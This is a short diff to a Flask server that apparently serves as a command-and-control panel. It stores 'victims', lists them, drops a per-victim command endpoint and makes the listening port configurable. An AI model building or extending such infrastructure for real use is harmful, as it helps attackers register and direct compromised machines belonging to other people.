@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import datetime
+import os
 
 app = Flask(__name__)
 victims = {}
@@ -21,9 +22,6 @@ def register():
 def list_victims():
     return jsonify(victims)
 
-@app.route('/cmd/<victim_id>', methods=['GET'])
-def get_command(victim_id):
-    return jsonify({"command": "ping"})
-
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
